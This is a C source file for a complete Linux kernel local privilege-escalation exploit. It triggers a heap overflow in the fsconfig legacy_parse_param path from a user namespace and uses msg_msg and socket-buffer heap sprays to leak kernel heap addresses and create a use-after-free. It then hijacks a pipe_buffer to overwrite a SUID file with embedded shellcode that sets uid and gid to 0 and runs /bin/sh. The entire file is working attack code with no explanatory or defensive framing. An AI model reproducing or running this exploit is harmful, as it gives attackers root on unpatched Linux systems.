// gcc -static -o exp exp.c
#define _GNU_SOURCE
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif
#define FSCONFIG_SET_STRING 1
#define fsopen(name, flags) syscall(__NR_fsopen, name, flags)
#define fsconfig(fd, cmd, key, value, aux) \
  syscall(__NR_fsconfig, fd, cmd, key, value, aux)

#define NUM_SOCKETS (4)
#define NUM_SKBUFFS (0x80)
#define NUM_MSQIDS_1 (8)
#define NUM_MSQIDS_2 (0x400)
#define NUM_PIPEFDS (0x100)
#define SKB_SHARED_INFO_SIZE 0x140

#define MSG_A_TEXT_SIZE \
  (0x1000 + 0x40 - sizeof(struct msg_msg) - sizeof(struct msg_msgseg))
#define MTYPE_A (0x41)
#define MTYPE_B1 (0x42)
#define MTYPE_B2 (0x43)
#define MTYPE_FAKE (0x45)
#define MSG_TAG (0xdeadaaaa)

#define ATTACK_FILE "/suid-test"

#define logdebug(fmt, ...) \
  dprintf(1, "\033[32m[*] " fmt "\033[0m\n", ##__VA_ARGS__)
#define loginfo(fmt, ...) \
  dprintf(1, "\033[34m[+] " fmt "\033[0m\n", ##__VA_ARGS__)
#define logerror(fmt, ...) \
  dprintf(2, "\033[31m[-] " fmt "\033[0m\n", ##__VA_ARGS__)
#define die(fmt, ...)                      \
  do                                       \
  {                                        \
    logerror(fmt, ##__VA_ARGS__);          \
    logerror("Exit at line %d", __LINE__); \
    write(notify_pipe[1], "N", 1);         \
    exit(1);                               \
  } while (0)

struct list_head
{
  uint64_t next;
  uint64_t prev;
};

struct msg_msg
{
  struct list_head m_list;
  uint64_t m_type;
  uint64_t m_ts;
  uint64_t next;
  uint64_t security;
  char mtext[0];
};

struct msg_msgseg
{
  uint64_t next;
};

struct typ_msg
{
  long mtype;
  char mtext[0];
};

struct pipe_buffer
{
  uint64_t page;
  uint32_t offset;
  uint32_t len;
  uint64_t ops;
  uint32_t flags;
  uint32_t pad;
  uint64_t private;
};

struct pipe_buf_operations
{
  uint64_t confirm;
  uint64_t release;
  uint64_t steal;
  uint64_t get;
};

char msg_buffer[0x2000];
char skb[1024 - SKB_SHARED_INFO_SIZE];
struct typ_msg *msg_a = (struct typ_msg *)msg_buffer;
struct typ_msg *msg_b = (struct typ_msg *)msg_buffer;
struct typ_msg *msg_a_oob = (struct typ_msg *)msg_buffer;
int sock_pairs[NUM_SOCKETS][2];
int msqid_1[NUM_MSQIDS_1];
int msqid_2[NUM_MSQIDS_2];
int pipe_fd[NUM_PIPEFDS][2];
int notify_pipe[2];
uint64_t kmalloc_1024;
int corrupted_msqid = -1;
int uaf_msqid = -1;
int fake_msqid;
int tfd;

const char attack_data[] = {
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x56, 0x56, 0x56,
    0x56, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    0xb0, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x02, 0x00, 0x40, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
    0xf6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf6, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x51, 0xe5, 0x74, 0x64, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x31, 0xff, 0x31, 0xd2,
    0x31, 0xf6, 0x6a, 0x75, 0x58, 0x0f, 0x05, 0x31, 0xff, 0x31, 0xd2, 0x31,
    0xf6, 0x6a, 0x77, 0x58, 0x0f, 0x05, 0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62,
    0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72,
    0x69, 0x01, 0x01, 0x81, 0x34, 0x24, 0x01, 0x01, 0x01, 0x01, 0x31, 0xf6,
    0x56, 0x6a, 0x08, 0x5e, 0x48, 0x01, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31,
    0xd2, 0x6a, 0x3b, 0x58, 0x0f, 0x05};

void init_unshare()
{
  int fd;
  char buff[0x100];

  // strace from `unshare -Ur xxx`
  unshare(CLONE_NEWNS | CLONE_NEWUSER);

  fd = open("/proc/self/setgroups", O_WRONLY);
  snprintf(buff, sizeof(buff), "deny");
  write(fd, buff, strlen(buff));
  close(fd);

  fd = open("/proc/self/uid_map", O_WRONLY);
  snprintf(buff, sizeof(buff), "0 %d 1", getuid());
  write(fd, buff, strlen(buff));
  close(fd);

  fd = open("/proc/self/gid_map", O_WRONLY);
  snprintf(buff, sizeof(buff), "0 %d 1", getgid());
  write(fd, buff, strlen(buff));
  close(fd);
}

void init_msg()
{
  for (int i = 0; i < NUM_MSQIDS_1; i++)
  {
    if ((msqid_1[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0)
      die("msgget() error");
  }

  for (int i = 0; i < NUM_MSQIDS_2; i++)
  {
    if ((msqid_2[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0)
      die("msgget() error");
  }
}

void clean_msg_1()
{
  for (int i = 0; i < NUM_MSQIDS_1; i++)
  {
    msgrcv(msqid_1[i], msg_a, MSG_A_TEXT_SIZE, MTYPE_A, IPC_NOWAIT);
  }
}

void clean_msg_2()
{
  for (int i = 0; i < NUM_MSQIDS_2; i++)
  {
    msgrcv(msqid_2[i], msg_b, 64 - sizeof(struct msg_msg), MTYPE_B1,
           IPC_NOWAIT);
    msgrcv(msqid_2[i], msg_b, 1024 - sizeof(struct msg_msg), MTYPE_B2,
           IPC_NOWAIT);
  }
}

void init_sock()
{
  for (int i = 0; i < NUM_SOCKETS; i++)
  {
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock_pairs[i]) < 0)
      die("socketpair() error");
  }
}

void bind_cpu()
{
  cpu_set_t my_set;
  CPU_ZERO(&my_set);
  CPU_SET(0, &my_set);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set))
  {
    die("sched_setaffinity() error");
  }
}

int call_fsopen()
{
  int fd = fsopen("ext4", 0);
  if (fd < 0)
  {
    die("fsopen() error");
  }
  return fd;
}

void spray_skbuff_data(void *ptr, size_t size)
{
  for (int i = 0; i < NUM_SOCKETS; i++)
  {
    for (int j = 0; j < NUM_SKBUFFS; j++)
    {
      if (write(sock_pairs[i][0], ptr, size) < 0)
      {
        die("write to sock pairs failed");
      }
    }
  }
}

void free_skbuff_data(void *ptr, size_t size)
{
  for (int i = 0; i < NUM_SOCKETS; i++)
  {
    for (int j = 0; j < NUM_SKBUFFS; j++)
    {
      if (read(sock_pairs[i][1], ptr, size) < 0)
      {
        die("read from sock pairs failed");
      }
    }
  }
}

void prepare_overflow(int fsid)
{

  char buff[0x100];
  logdebug("prepare fsconfig heap overflow");
  memset(buff, 0, sizeof(buff));
  memset(buff, 'A', 0x100 - 2);
  for (int i = 0; i < 0xf; i++)
  {
    // ",=" + buff
    fsconfig(fsid, FSCONFIG_SET_STRING, "\x00", buff, 0);
  }
  memset(buff, 0, sizeof(buff));
  memset(buff, 'B', 0x100 - 3);
  // ",=" + buff
  fsconfig(fsid, FSCONFIG_SET_STRING, "\x00", buff, 0);
}

int do_leak_heap(int fsid)
{

  char buff[0x100];
  logdebug("--- do_leak_heap ---");

  prepare_overflow(fsid);

  logdebug("spraying messasge queue 1...");
  for (int i = 0; i < NUM_MSQIDS_1; i++)
  {
    msg_a->mtype = MTYPE_A;
    memset(msg_a->mtext, 'A', MSG_A_TEXT_SIZE);
    ((int *)&msg_a->mtext)[0] = MSG_TAG;
    ((int *)&msg_a->mtext)[1] = i;
    if (msgsnd(msqid_1[i], msg_a, MSG_A_TEXT_SIZE, 0) < 0)
      die("msgsnd() error");
  }

  logdebug("spraying messasge queue 2...");
  for (int i = 0; i < NUM_MSQIDS_2; i++)
  {
    size_t n = 1024 - sizeof(struct msg_msg);
    memset(msg_b->mtext, 'B', n);

    ((int *)&msg_b->mtext)[0] = MSG_TAG;
    ((int *)&msg_b->mtext)[1] = i;

    msg_b->mtype = MTYPE_B1;
    n = 64 - sizeof(struct msg_msg);
    if (msgsnd(msqid_2[i], msg_b, n, 0) < 0)
      die("msgsnd() error");

    msg_b->mtype = MTYPE_B2;
    n = 1024 - sizeof(struct msg_msg);
    if (msgsnd(msqid_2[i], msg_b, n, 0) < 0)
      die("msgsnd() error");
  }

  logdebug("trigger oob write in `legacy_parse_param` to msg_msg.m_ts");
  memset(buff, 0, sizeof(buff));
  strcat(buff, "0000000");  // m_list.next
  strcat(buff, "11111111"); // m_list.prev
  strcat(buff, "22222222"); // m_type
  uint64_t target_size = MSG_A_TEXT_SIZE + 64 * 30;
  memcpy(buff + strlen(buff), &target_size, 2); // m_ts
  fsconfig(fsid, FSCONFIG_SET_STRING, "\x00", buff, 0);

  logdebug("searching corrupted msg_msg...");
  for (int i = 0; i < NUM_MSQIDS_1; i++)
  {
    size_t n = msgrcv(msqid_1[i], msg_a_oob, MSG_A_TEXT_SIZE + 64 * 30, 0,
                      MSG_COPY | IPC_NOWAIT);
    if (n < 0)
      continue;

    if (n == MSG_A_TEXT_SIZE + 64 * 30)
    {
      corrupted_msqid = msqid_1[i];
      if ((msqid_1[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) <
          0) // call clean_msg_1 without crash
        die("msgget() error");

      struct msg_msg *p =
          (struct msg_msg *)(msg_a_oob->mtext + MSG_A_TEXT_SIZE);
      for (int j = 0; j < 30; j++)
      {
        if (p->m_type == MTYPE_B1 && p->m_ts == 64 - sizeof(struct msg_msg) &&
            ((int *)&p->mtext)[0] == MSG_TAG)
        {
          uaf_msqid = msqid_2[((int *)&p->mtext)[1]];
          loginfo("corrupted_msqid = %d", corrupted_msqid);
          loginfo("uaf_msqid = %d", uaf_msqid);

          kmalloc_1024 = p->m_list.next;

          // call clean_msg_2 without crash
          if ((msqid_2[((int *)&p->mtext)[1]] =
                   msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0)
            die("msgget() error");

          break;
        }

        p++;
      }

      break;
    }
  }

  clean_msg_1();
  clean_msg_2();

  if (uaf_msqid < 0)
    return 0;

  loginfo("kmalloc_1024 = %#lx", kmalloc_1024);

  return 1;
}

void fake_msg_msg_at_kmalloc_1024()
{
  logdebug("--- fake_msg_msg_at_kmalloc_1024 ---");

  logdebug("free kmalloc-1024");
  if (msgrcv(uaf_msqid, msg_b, 1024 - sizeof(struct msg_msg), MTYPE_B2, 0) < 0)
    die("msgrcv() error");

  logdebug("spraying skb...");
  memset(skb, 0, sizeof(skb));
  struct msg_msg *msg = (struct msg_msg *)skb;
  msg->m_list.next = kmalloc_1024 + 0x200; // no matter
  msg->m_list.prev = kmalloc_1024 + 0x300; // no matter
  msg->m_type = MTYPE_FAKE;
  msg->m_ts = 0x100;
  msg->security = 0;

  msg++;
  msg->m_list.next = kmalloc_1024;
  msg->m_list.prev = kmalloc_1024 + 0x400;
  msg->m_type = MTYPE_A;
  msg->m_ts = 0x233;
  msg->security = 0;

  spray_skbuff_data(skb, sizeof(skb)); // no matter
}

int create_uaf(int fsid)
{
  char buff[0x100];
  int target_idx = -1;

  logdebug("--- create_uaf ---");

  prepare_overflow(fsid);

  logdebug("spraying messasge queue 1...");
  for (int i = 0; i < NUM_MSQIDS_1; i++)
  {
    msg_a->mtype = MTYPE_A;
    memset(msg_a->mtext, 'A', MSG_A_TEXT_SIZE);
    ((int *)&msg_a->mtext)[0] = MSG_TAG;
    ((int *)&msg_a->mtext)[1] = i;
    if (msgsnd(msqid_1[i], msg_a, MSG_A_TEXT_SIZE, 0) < 0)
      die("msgsnd() error");
  }

  logdebug("trigger oob write in `legacy_parse_param` to corrupt messageA's "
           "msg_msg.m_ts");
  memset(buff, 0, sizeof(buff));
  struct msg_msg *msg = (struct msg_msg *)buff;
  msg->m_list.next = kmalloc_1024 + sizeof(struct msg_msg);
  msg->m_list.prev = 0xdeadbeefdeadbeef;
  msg->m_type = MTYPE_A; // append '=\x00'
  fsconfig(fsid, FSCONFIG_SET_STRING, buff, "\x00", 0);

  logdebug("searching corrupted msg_msg for freeing fake msg_msg...");
  fake_msqid = -1;
  for (int i = 0; i < NUM_MSQIDS_1; i++)
  {
    size_t n = msgrcv(msqid_1[i], msg_a, 0x100, 2, MSG_COPY | IPC_NOWAIT);
    if (n < 0)
      continue;

    if (n == 0x100 && msg_a->mtype == MTYPE_FAKE)
    {
      fake_msqid = msqid_1[i];
      if ((msqid_1[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0)
        die("msgget() error");

      loginfo("fake_msqid = %d", fake_msqid);
      break;
    }
  }

  if (fake_msqid < 0)
  {
    clean_msg_1();
    return 0;
  }

  clean_msg_1();

  return 1;
}

void pipe_primitive()
{
  char buff[0x400];

  logdebug("open target file %s", ATTACK_FILE);
  if ((tfd = open(ATTACK_FILE, O_RDONLY)) < 0)
    die("failed to open target file");

  logdebug("freeing fake msg_msg...");
  if (msgrcv(fake_msqid, msg_a, 0x100, MTYPE_FAKE, 0) < 0)
    die("msgrcv() error");

  logdebug("spraying pipe_buffer...");
  for (int i = 0; i < NUM_PIPEFDS; i++)
  {
    if (pipe(pipe_fd[i]))
    {
      die("Alloc pipe failed");
    }

    write(pipe_fd[i][1], buff, 0x100 + i);

    loff_t offset = 1;
    ssize_t nbytes = splice(tfd, &offset, pipe_fd[i][1], NULL, 1, 0);
    if (nbytes < 0)
    {
      die("splice() failed");
    }
  }

  logdebug("free skbuff_data to make pipe_buffer become UAF");
  int uaf_pipe_idx = -1;
  char backup_skb[sizeof(skb)];
  int PIPE_BUF_FLAG_CAN_MERGE = 0x10;

  memset(skb, 0, sizeof(skb));
  for (int i = 0; i < NUM_SOCKETS; i++)
  {
    for (int j = 0; j < NUM_SKBUFFS; j++)
    {
      if (read(sock_pairs[i][1], skb, sizeof(skb)) < 0)
      {
        die("read from sock pairs failed");
      }

      struct pipe_buffer *pb = (struct pipe_buffer *)skb;
      if (pb->len >= 0x100 && pb->len < 0x100 + NUM_PIPEFDS)
      {
        uaf_pipe_idx = pb->len - 0x100;
        loginfo("uaf_pipe_idx = %d", uaf_pipe_idx);
        memcpy(backup_skb, skb, sizeof(skb));
      }
    }
  }

  if (uaf_pipe_idx < 0)
    die("uaf_pipe_idx not found");

  logdebug("edit pipe_buffer->flags");
  struct pipe_buffer *pb = (struct pipe_buffer *)backup_skb;
  pb[1].len = 0;
  pb[1].offset = 0;
  pb[1].flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb[1].ops = pb[0].ops;
  spray_skbuff_data(backup_skb, sizeof(backup_skb));

  logdebug("try to overwrite %s, by pipe fd %d", ATTACK_FILE,
           pipe_fd[uaf_pipe_idx][1]);
  if (write(pipe_fd[uaf_pipe_idx][1], attack_data, sizeof(attack_data)) !=
      sizeof(attack_data))
    die("write");

  logdebug("see if %s changed", ATTACK_FILE);
  close(tfd);
  tfd = open(ATTACK_FILE, O_RDONLY);
  if (tfd < 0)
  {
    die("open attack file");
  }
  char tmp_buffer[0x10];
  read(tfd, tmp_buffer, 0x10);
  uint32_t *ptr = (uint32_t *)(tmp_buffer + 9);
  if (ptr[0] != 0x56565656)
  {
    die("overwrite attack file failed: 0x%08x", ptr[0]);
  }
}

int main(int argc, char const *argv[])
{
  int fsid;
  int pid;

  if (pipe(notify_pipe) < 0)
    die("pipe() error");

  if ((pid = fork()) == 0)
  {
    init_unshare();
    bind_cpu();
    init_sock();
    init_msg();

    fsid = call_fsopen();
    while (!do_leak_heap(fsid))
    {
      close(fsid);
      fsid = call_fsopen();

      logdebug("retry do_leak_heap()");
    }

    fake_msg_msg_at_kmalloc_1024();

    close(fsid);
    fsid = call_fsopen();
    while (!create_uaf(fsid))
    {
      close(fsid);
      fsid = call_fsopen();

      logdebug("retry create_uaf()");
    }

    pipe_primitive();

    loginfo("exploit success!");
    write(notify_pipe[1], "Y", 1);

    pause();
  }
  else if (pid > 0)
  {
    char sync;
    read(notify_pipe[0], &sync, 1);
    if (sync == 'Y')
      execl(ATTACK_FILE, ATTACK_FILE, NULL);
  }
  else
  {
    die("fork() error");
  }

  return 0;
}
